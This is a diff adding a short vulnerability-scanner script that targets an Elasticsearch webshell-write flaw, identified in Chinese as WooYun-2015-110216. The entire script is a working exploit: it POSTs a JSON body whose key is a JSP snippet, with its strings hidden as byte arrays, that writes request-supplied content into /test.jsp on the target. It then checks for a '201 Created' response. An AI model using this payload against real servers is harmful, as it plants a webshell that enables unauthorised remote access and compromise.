@@ -1,0 +1,14 @@
+#request url = var
+#define payload = /wker.jsp/wker.jsp/1
+#define bug = 201 Created
+#define info = 存在Elasticsearch写入webshell漏洞（WooYun-2015-110216）
+#define post = {"<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>":"test"}
+
+function main(args)
+{
+	res = HttpPost(url.payload,post,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[1],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
